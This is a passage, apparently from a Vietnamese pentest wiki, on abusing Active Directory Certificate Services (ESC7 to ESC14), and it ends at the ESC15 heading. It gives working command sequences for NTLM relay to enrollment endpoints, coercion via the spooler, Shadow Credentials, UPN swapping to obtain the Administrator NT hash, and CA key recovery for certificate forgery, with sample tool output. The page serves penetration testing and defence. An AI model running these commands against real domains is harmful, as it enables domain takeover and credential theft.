Vì template mục tiêu **không định nghĩa giá trị mặc định cho phần mở rộng đó**, CA sẽ KHÔNG ghi đè giá trị do kẻ tấn công kiểm soát khi yêu cầu được cấp chứng chỉ. Do đó, chứng chỉ tạo ra sẽ chứa phần mở rộng do kẻ tấn công chọn, có thể:

* Đáp ứng các yêu cầu Application / Issuance Policy của những template dễ bị tấn công khác (dẫn đến leo thang đặc quyền).
* Chèn thêm EKU hoặc policy để chứng chỉ có được mức độ tin cậy ngoài dự kiến trong các hệ thống bên thứ ba.

Tóm lại, *Manage Certificates* — trước đây được xem là nửa “ít quyền lực hơn” của ESC7 — giờ đây có thể được tận dụng để leo thang đặc quyền toàn diện hoặc duy trì quyền truy cập lâu dài, mà không cần sửa cấu hình CA hay có quyền *Manage CA* bị hạn chế nghiêm ngặt hơn.

#### Lạm dụng primitive này với Certify 2.0

1. **Gửi một yêu cầu chứng chỉ sẽ tiếp tục ở trạng thái *đang chờ*.** Có thể buộc yêu cầu ở trạng thái này bằng một template yêu cầu người quản lý phê duyệt:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Thêm một extension tùy chỉnh vào yêu cầu đang chờ xử lý** bằng lệnh `manage-ca` mới:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Nếu template chưa định nghĩa extension *Certificate Issuance Policies*, giá trị ở trên sẽ được giữ nguyên sau khi cấp chứng chỉ.*

3. **Gửi yêu cầu** (nếu role của bạn cũng có quyền phê duyệt *Manage Certificates*) hoặc chờ operator phê duyệt. Sau khi được cấp, hãy tải chứng chỉ xuống:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Chứng chỉ thu được hiện chứa OID issuance-policy độc hại và có thể được sử dụng trong các cuộc tấn công tiếp theo (ví dụ: ESC13, leo thang đặc quyền trong domain, v.v.).

> NOTE: Có thể thực hiện cùng cuộc tấn công bằng Certipy ≥ 4.7 thông qua lệnh `ca` và tham số `-set-extension`.

## NTLM Relay đến các HTTP Endpoint của AD CS – ESC8

### Giải thích

> [!TIP]
> Trong các môi trường **đã cài đặt AD CS**, nếu tồn tại **web enrollment endpoint dễ bị tấn công** và có ít nhất một **certificate template được publish** cho phép **máy tính trong domain đăng ký chứng chỉ và xác thực client** (chẳng hạn template mặc định **`Machine`**), kẻ tấn công có thể xâm phạm **bất kỳ máy tính nào đang bật dịch vụ spooler**!

AD CS hỗ trợ một số **phương thức enrollment dựa trên HTTP**, được cung cấp thông qua các server role bổ sung mà quản trị viên có thể cài đặt. Các giao diện enrollment chứng chỉ dựa trên HTTP này dễ bị **NTLM relay attack**. Kẻ tấn công, từ một **máy đã bị xâm phạm, có thể mạo danh bất kỳ tài khoản AD nào xác thực bằng NTLM gửi đến**. Khi mạo danh tài khoản nạn nhân, kẻ tấn công có thể truy cập các giao diện web này để **yêu cầu client authentication certificate bằng certificate template `User` hoặc `Machine`**.

- **Giao diện web enrollment** (một ứng dụng ASP cũ có tại `http://<caserver>/certsrv/`) mặc định chỉ dùng HTTP, nên không bảo vệ khỏi NTLM relay attack. Ngoài ra, giao diện này chỉ cho phép xác thực NTLM thông qua HTTP Authorization header, khiến các phương thức xác thực an toàn hơn như Kerberos không thể áp dụng.
- **Certificate Enrollment Service** (CES), Web Service **Certificate Enrollment Policy** (CEP) và **Network Device Enrollment Service** (NDES) mặc định hỗ trợ xác thực negotiate thông qua HTTP Authorization header. Xác thực negotiate **hỗ trợ cả** Kerberos lẫn **NTLM**, cho phép kẻ tấn công **hạ cấp xuống** xác thực NTLM trong các cuộc relay attack. Dù các web service này mặc định bật HTTPS, chỉ HTTPS thôi **không bảo vệ được khỏi NTLM relay attack**. Chỉ có thể bảo vệ các dịch vụ HTTPS khỏi NTLM relay attack khi kết hợp HTTPS với channel binding. Đáng tiếc là AD CS không bật Extended Protection for Authentication trên IIS, vốn là yêu cầu để sử dụng channel binding.<sup>[[6]](#references)</sup>

Một **vấn đề** thường gặp với NTLM relay attack là **phiên NTLM có thời hạn ngắn** và kẻ tấn công không thể tương tác với các dịch vụ **yêu cầu NTLM signing**.

Tuy nhiên, có thể khắc phục hạn chế này bằng cách khai thác NTLM relay attack để lấy certificate của người dùng, vì thời hạn hiệu lực của certificate quyết định thời lượng phiên và certificate có thể được dùng với các dịch vụ **bắt buộc NTLM signing**. Để biết cách sử dụng certificate bị đánh cắp, hãy tham khảo:


{{#ref}}
account-persistence.md
{{#endref}}

Một hạn chế khác của NTLM relay attack là **tài khoản nạn nhân phải xác thực với máy do kẻ tấn công kiểm soát**. Kẻ tấn công có thể chờ hoặc tìm cách **buộc** quá trình xác thực này xảy ra:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Khai thác**

Lệnh `cas` của [**Certify**](https://github.com/GhostPack/Certify) liệt kê các **HTTP endpoint AD CS đang bật**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Thuộc tính `msPKI-Enrollment-Servers` được các Certificate Authority (CA) doanh nghiệp dùng để lưu trữ các endpoint của Certificate Enrollment Service (CES). Có thể phân tích cú pháp và liệt kê các endpoint này bằng công cụ **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Lạm dụng với Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Lạm dụng với [Certipy](https://github.com/ly4k/Certipy)

Theo mặc định, Certipy yêu cầu cấp chứng chỉ dựa trên template `Machine` hoặc `User`, tùy thuộc vào việc tên tài khoản được relay có kết thúc bằng `$` hay không. Có thể chỉ định template khác bằng tham số `-template`.

Sau đó, có thể sử dụng kỹ thuật như [PetitPotam](https://github.com/ly4k/PetitPotam) để ép xác thực. Khi xử lý domain controller, cần chỉ định `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## Không có phần mở rộng bảo mật - ESC9 <a href="#id-5485" id="id-5485"></a>

### Giải thích

Giá trị **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) của **`msPKI-Enrollment-Flag`**, được gọi là ESC9, loại bỏ phần mở rộng SID `szOID_NTDS_CA_SECURITY_EXT` khỏi chứng chỉ. Các ví dụ ESC9 cũ dựa vào hành vi tương thích của KDC (`StrongCertificateBindingEnforcement=1`) hoặc một cách ánh xạ Schannel yếu riêng biệt. Giá trị `1` là **thiết lập tương thích trong quá khứ**, không phải mặc định hiện tại: Microsoft cho biết tùy chọn ghi đè KDC đã ngừng được hỗ trợ từ bản cập nhật bảo mật Windows ngày 9 tháng 9 năm 2025. Hãy kiểm tra bản cập nhật thực tế trên mục tiêu và điểm cuối xác thực trước khi áp dụng hướng dẫn cũ.<sup>[[7]](#references)</sup> Xem [hướng dẫn triển khai của Microsoft](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Các điều kiện khiến thiết lập của cờ này trở nên quan trọng bao gồm:

- Trên KDC cũ còn tương thích, chính sách liên kết chứng chỉ có hiệu lực cho phép ánh xạ; hoặc điểm cuối Schannel bật riêng việc ánh xạ UPN thông qua bit `0x4` của `CertificateMappingMethods`.
- Chứng chỉ được đánh dấu bằng cờ `CT_FLAG_NO_SECURITY_EXTENSION` trong thiết lập `msPKI-Enrollment-Flag`.
- Chứng chỉ chỉ định bất kỳ EKU xác thực client nào.
- Có quyền `GenericWrite` trên một tài khoản bất kỳ để chiếm quyền một tài khoản khác.

### Kịch bản khai thác

Giả sử `John@corp.local` có quyền `GenericWrite` trên `Jane@corp.local` và mục tiêu là chiếm quyền `Administrator@corp.local`. Mẫu chứng chỉ `ESC9`, mà `Jane@corp.local` được phép đăng ký, được cấu hình cờ `CT_FLAG_NO_SECURITY_EXTENSION` trong thiết lập `msPKI-Enrollment-Flag`.

Ban đầu, hash của `Jane` được lấy bằng Shadow Credentials nhờ quyền `GenericWrite` của `John`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Sau đó, `userPrincipalName` của `Jane` được sửa thành `Administrator`, cố ý bỏ phần miền `@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Việc sửa đổi này không vi phạm các ràng buộc, vì `Administrator@corp.local` vẫn khác với `userPrincipalName` của `Administrator`.

Sau đó, yêu cầu chứng chỉ từ template `ESC9` được đánh dấu là dễ bị tấn công dưới danh tính `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Lưu ý rằng `userPrincipalName` của certificate hiển thị `Administrator`, nhưng không có “object SID”.

Sau đó, `userPrincipalName` của `Jane` được khôi phục về giá trị ban đầu là `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Giờ đây, thử xác thực bằng chứng chỉ đã cấp sẽ trả về NT hash của `Administrator@corp.local`. Lệnh phải bao gồm `-domain <domain>` vì chứng chỉ không chỉ định domain:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Ánh xạ chứng chỉ yếu - ESC10

### Giải thích

ESC10 thường đề cập đến hai chính sách ánh xạ chứng chỉ riêng biệt. Hãy kiểm tra cài đặt trên endpoint thực sự xử lý việc xác thực liên quan:

- `CertificateMappingMethods` của Schannel trong `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` kiểm soát ánh xạ chứng chỉ client TLS trên máy chủ ứng dụng. Bit UPN là `0x4`; trên các hệ thống đã cập nhật, giá trị mặc định là `0x18` (`0x8 | 0x10`).
- `StrongCertificateBindingEnforcement` của KDC trong `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` trước đây kiểm soát khả năng tương thích của liên kết chứng chỉ Kerberos. Giá trị `1` không phải là mặc định hiện tại đáng tin cậy, và Microsoft đã ngừng hỗ trợ tùy chọn ghi đè này kể từ bản cập nhật bảo mật Windows ngày 9 tháng 9 năm 2025. Trạng thái của nó không tự mô tả ánh xạ UPN của Schannel.<sup>[[7]](#references)</sup>

**Trường hợp 1**

Trước đây, KDC cũ có thể áp dụng `StrongCertificateBindingEnforcement=0`; hãy xác minh mức cập nhật vì tùy chọn ghi đè này không còn được hỗ trợ trên các hệ thống hiện tại đã cài bản vá.

**Trường hợp 2**

Endpoint chứng chỉ client Schannel bật bit UPN (`0x4`) trong `CertificateMappingMethods`. Đây là cài đặt riêng biệt với chính sách liên kết mạnh của KDC, đồng thời vẫn cần có chứng chỉ xác thực client có thể đăng ký và quyền kiểm soát hiệu lực đối với thuộc tính tài khoản được ánh xạ.

### Trường hợp lạm dụng 1

Trong một triển khai cũ mà KDC vẫn áp dụng `StrongCertificateBindingEnforcement=0`, quyền kiểm soát `userPrincipalName` của một tài khoản có thể là một phần của đường tấn công ánh xạ yếu sang tài khoản khác. Cần kiểm tra riêng việc đăng ký chứng chỉ, ánh xạ, danh tính mục tiêu và xác thực thành công; chỉ riêng ACE `GenericWrite` hoặc giá trị registry không đủ để xác lập khả năng chiếm quyền.

Ví dụ, khi có quyền `GenericWrite` đối với `Jane@corp.local`, kẻ tấn công nhắm đến việc xâm phạm `Administrator@corp.local`. Quy trình tương tự ESC9, cho phép sử dụng bất kỳ certificate template nào.

Trước tiên, hash của `Jane` được lấy bằng Shadow Credentials, khai thác quyền `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Sau đó, `userPrincipalName` của `Jane` được đổi thành `Administrator`, cố ý bỏ phần `@corp.local` để tránh vi phạm ràng buộc.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Sau đó, yêu cầu một chứng chỉ cho phép xác thực client dưới danh tính `Jane`, sử dụng template `User` mặc định.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` của `Jane` sau đó được khôi phục về giá trị ban đầu là `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Xác thực bằng chứng chỉ thu được sẽ trả về NT hash của `Administrator@corp.local`; cần chỉ định domain trong lệnh vì chứng chỉ không chứa thông tin về domain.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Trường hợp lạm dụng 2

Khi `CertificateMappingMethods` chứa bit flag `UPN` (`0x4`), tài khoản A có quyền `GenericWrite` có thể xâm phạm bất kỳ tài khoản B nào không có thuộc tính `userPrincipalName`, bao gồm tài khoản máy và tài khoản quản trị viên miền tích hợp sẵn `Administrator`.

Ở đây, mục tiêu là xâm phạm `DC$@corp.local`, bắt đầu bằng cách lấy hash của `Jane` thông qua Shadow Credentials, tận dụng quyền `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`userPrincipalName` của `Jane` sau đó được đặt thành `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Một chứng chỉ xác thực client được yêu cầu với tư cách `Jane` bằng template `User` mặc định.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` của `Jane` được khôi phục về giá trị ban đầu sau quá trình này.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Để xác thực qua Schannel, sử dụng tùy chọn `-ldap-shell` của Certipy, cho thấy xác thực thành công với `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Thông qua LDAP shell, các lệnh như `set_rbcd` cho phép thực hiện các cuộc tấn công Resource-Based Constrained Delegation (RBCD), có khả năng xâm phạm domain controller.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Lỗ hổng này cũng áp dụng với bất kỳ tài khoản người dùng nào không có `userPrincipalName` hoặc có giá trị không khớp với `sAMAccountName`. Tài khoản mặc định `Administrator@corp.local` là mục tiêu nổi bật do có quyền LDAP cao và mặc định không có `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Giải thích

Nếu CA Server chưa được cấu hình với `IF_ENFORCEENCRYPTICERTREQUEST`, có thể thực hiện các cuộc tấn công NTLM relay qua dịch vụ RPC mà không cần signing. [Tham khảo tại đây](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Bạn có thể dùng `certipy` để kiểm tra xem `Enforce Encryption for Requests` có bị tắt hay không; certipy sẽ hiển thị các lỗ hổng `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Kịch bản lạm dụng

Cần thiết lập một relay server:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Lưu ý: Đối với domain controller, chúng ta phải chỉ định `-template` trong DomainController.

Hoặc sử dụng [bản fork impacket của sploutchy](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Truy cập shell vào ADCS CA bằng YubiHSM - ESC12

### Giải thích

Quản trị viên có thể thiết lập Certificate Authority để lưu trữ khóa trên một thiết bị bên ngoài như "Yubico YubiHSM2".

Nếu thiết bị USB được kết nối với máy chủ CA qua cổng USB, hoặc thông qua một máy chủ thiết bị USB nếu máy chủ CA là máy ảo, thì cần có khóa xác thực (đôi khi được gọi là "mật khẩu") để Key Storage Provider tạo và sử dụng khóa trong YubiHSM.

Khóa/mật khẩu này được lưu dưới dạng văn bản thuần trong registry tại `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Tham khảo [tại đây](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Kịch bản khai thác

Nếu khóa riêng của CA được lưu trên thiết bị USB vật lý khi bạn có được quyền truy cập shell, bạn có thể khôi phục khóa.

Trước tiên, bạn cần lấy chứng chỉ CA (đây là thông tin công khai), sau đó:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Cuối cùng, dùng lệnh certutil `-sign` để giả mạo một chứng chỉ tùy ý mới bằng chứng chỉ CA và khóa riêng của nó.

## OID Group Link Abuse - ESC13

### Giải thích

Thuộc tính `msPKI-Certificate-Policy` cho phép thêm chính sách cấp phát vào mẫu chứng chỉ. Có thể tìm thấy các đối tượng `msPKI-Enterprise-Oid` chịu trách nhiệm cấp phát chính sách trong Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) của bộ chứa PKI OID. Có thể liên kết một chính sách với một nhóm AD bằng thuộc tính `msDS-OIDToGroupLink` của đối tượng này, cho phép hệ thống cấp quyền cho người dùng xuất trình chứng chỉ như thể họ là thành viên của nhóm đó. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Nói cách khác, khi người dùng có quyền đăng ký chứng chỉ và chứng chỉ được liên kết với một nhóm OID, người dùng có thể thừa hưởng các đặc quyền của nhóm này.

Dùng [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) để tìm `OIDToGroupLink`:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Kịch bản khai thác

Tìm quyền của người dùng bằng `certipy find` hoặc `Certify.exe find /showAllPermissions`.

Nếu `John` có quyền đăng ký `VulnerableTemplate`, người dùng đó có thể kế thừa các đặc quyền của nhóm `VulnerableGroup`.

Tất cả những gì người dùng cần làm là chỉ định template; họ sẽ nhận được chứng chỉ có quyền OIDToGroupLink.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Lạm dụng ánh xạ chứng chỉ tường minh — ESC14

### Giải thích

Phần mô tả tại https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping rất đầy đủ. Dưới đây là trích dẫn từ văn bản gốc.<sup>[[14]](#references)</sup>

ESC14 đề cập đến các lỗ hổng phát sinh từ “ánh xạ chứng chỉ tường minh yếu”, chủ yếu do sử dụng sai hoặc cấu hình không an toàn thuộc tính `altSecurityIdentities` trên tài khoản người dùng hoặc máy tính trong Active Directory. Thuộc tính đa giá trị này cho phép quản trị viên liên kết thủ công chứng chỉ X.509 với một tài khoản AD để xác thực. Khi được điền giá trị, các ánh xạ tường minh này có thể ghi đè logic ánh xạ chứng chỉ mặc định, vốn thường dựa vào UPN hoặc tên DNS trong SAN của chứng chỉ, hoặc SID được nhúng trong phần mở rộng bảo mật `szOID_NTDS_CA_SECURITY_EXT`.

Ánh xạ được xem là “yếu” khi chuỗi giá trị dùng trong thuộc tính `altSecurityIdentities` để xác định chứng chỉ quá bao quát, dễ đoán, dựa vào các trường chứng chỉ không có tính duy nhất hoặc sử dụng các thành phần chứng chỉ dễ giả mạo. Nếu kẻ tấn công có thể lấy được hoặc tạo chứng chỉ có thuộc tính khớp với ánh xạ tường minh yếu như vậy của một tài khoản có đặc quyền, họ có thể dùng chứng chỉ đó để xác thực và mạo danh tài khoản ấy.

Một số ví dụ về chuỗi ánh xạ `altSecurityIdentities` có khả năng yếu:

- Chỉ ánh xạ theo Common Name (CN) phổ biến của Subject: ví dụ, `X509:<S>CN=SomeUser`. Kẻ tấn công có thể lấy được chứng chỉ có CN này từ một nguồn kém an toàn hơn.
- Dùng Distinguished Name (DN) của Issuer hoặc Subject quá chung chung mà không có thông tin bổ sung như số sê-ri cụ thể hoặc mã định danh khóa chủ thể: ví dụ, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Dùng các mẫu dễ đoán khác hoặc mã định danh phi mật mã mà kẻ tấn công có thể đáp ứng trong chứng chỉ họ có thể lấy hợp pháp hoặc giả mạo (nếu họ đã xâm phạm CA hoặc tìm thấy một template dễ bị tấn công như trong ESC1).

Thuộc tính `altSecurityIdentities` hỗ trợ nhiều định dạng ánh xạ, chẳng hạn:

- `X509:<I>IssuerDN<S>SubjectDN` (ánh xạ theo DN đầy đủ của Issuer và Subject)
- `X509:<SKI>SubjectKeyIdentifier` (ánh xạ theo giá trị phần mở rộng Subject Key Identifier của chứng chỉ)
- `X509:<SR>SerialNumberBackedByIssuerDN` (ánh xạ theo số sê-ri, ngầm định được xác định cùng với DN của Issuer) - đây không phải định dạng tiêu chuẩn; thường dùng `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (ánh xạ theo tên RFC822, thường là địa chỉ email, trong SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (ánh xạ theo giá trị băm SHA1 của khóa công khai thô trong chứng chỉ - thường là mạnh)

Mức độ bảo mật của các ánh xạ này phụ thuộc vào mã định danh được dùng trong ánh xạ. Microsoft xếp các ánh xạ dựa trên email hoặc tên chủ thể, bao gồm `X509:<RFC822>`, là **yếu**. Trong chế độ Full Enforcement, chứng chỉ không có ánh xạ mạnh sẽ bị từ chối; bản cập nhật bảo mật Windows tháng 9 năm 2025 đã loại bỏ tùy chọn quay lại chế độ Compatibility. Vì vậy, chỉ riêng ánh xạ yếu không phải là con đường mạo danh đáng tin cậy hiện nay. Hãy kiểm tra mức bản vá thực tế của domain controller và cách xử lý ánh xạ chứng chỉ trước khi đánh giá tình huống ánh xạ yếu. Quyền ghi vào `altSecurityIdentities` là một manh mối riêng: kẻ tấn công có chứng chỉ đáng tin cậy phù hợp có thể thêm ánh xạ tường minh **mạnh**, tùy thuộc vào quyền hiệu lực và việc xác thực chứng chỉ. Xem [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) và [nghiên cứu về ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Cũng cần chẩn đoán các lỗi xác thực chứng chỉ: tài khoản mục tiêu bị vô hiệu hóa hoặc mật khẩu hết hạn có thể ngăn đăng nhập ngay cả khi chứng chỉ vẫn còn hiệu lực.

### Kịch bản lạm dụng

ESC14 nhắm vào **ánh xạ chứng chỉ tường minh** trong Active Directory (AD), cụ thể là thuộc tính `altSecurityIdentities`. Nếu thuộc tính này được thiết lập (theo thiết kế hoặc do cấu hình sai), kẻ tấn công có thể mạo danh tài khoản bằng cách xuất trình chứng chỉ khớp với ánh xạ.

#### Kịch bản A: Kẻ tấn công có thể ghi vào `altSecurityIdentities`

 **Điều kiện tiên quyết**: Kẻ tấn công có quyền ghi vào thuộc tính `altSecurityIdentities` của tài khoản mục tiêu hoặc có quyền cấp quyền đó dưới dạng một trong các quyền sau trên đối tượng AD mục tiêu:  
- Ghi thuộc tính `altSecurityIdentities`  
- Ghi thuộc tính `Public-Information`  
- Ghi thuộc tính (tất cả)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Chủ sở hữu*.
#### Kịch bản B: Mục tiêu có ánh xạ yếu qua X509RFC822 (Email)

- **Điều kiện tiên quyết mang tính lịch sử/có điều kiện**: Mục tiêu có ánh xạ X509RFC822 yếu trong `altSecurityIdentities`, kẻ tấn công có thể chỉnh sửa thuộc tính `mail` của người đăng ký chứng chỉ và có template phù hợp đưa email đó vào chứng chỉ xác thực máy khách mà không có liên kết SID xung đột. Để xác thực thành công, môi trường cũng phải còn chấp nhận ánh xạ yếu; chế độ Full Enforcement từ chối các ánh xạ chứng chỉ chỉ có ánh xạ yếu. Chỉ riêng thuộc tính `mail` có thể ghi là một manh mối.
#### Kịch bản C: Mục tiêu có ánh xạ X509IssuerSubject

- **Điều kiện tiên quyết**: Mục tiêu có ánh xạ tường minh X509IssuerSubject yếu trong `altSecurityIdentities`. Kẻ tấn công có thể đặt thuộc tính `cn` hoặc `dNSHostName` trên một principal nạn nhân để khớp với subject trong ánh xạ X509IssuerSubject của mục tiêu. Sau đó, kẻ tấn công có thể đăng ký chứng chỉ dưới danh nghĩa nạn nhân và dùng chứng chỉ này để xác thực với tư cách mục tiêu.
#### Kịch bản D: Mục tiêu có ánh xạ X509SubjectOnly

- **Điều kiện tiên quyết**: Mục tiêu có ánh xạ tường minh X509SubjectOnly yếu trong `altSecurityIdentities`. Kẻ tấn công có thể đặt thuộc tính `cn` hoặc `dNSHostName` trên một principal nạn nhân để khớp với subject trong ánh xạ X509SubjectOnly của mục tiêu. Sau đó, kẻ tấn công có thể đăng ký chứng chỉ dưới danh nghĩa nạn nhân và dùng chứng chỉ này để xác thực với tư cách mục tiêu.
### Các thao tác cụ thể
#### Kịch bản A

Yêu cầu chứng chỉ từ certificate template `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Lưu và chuyển đổi chứng chỉ

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Xác thực (sử dụng chứng chỉ)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Dọn dẹp (tùy chọn)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Để xem các phương thức tấn công cụ thể hơn trong các kịch bản tấn công khác nhau, vui lòng tham khảo: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Giải thích

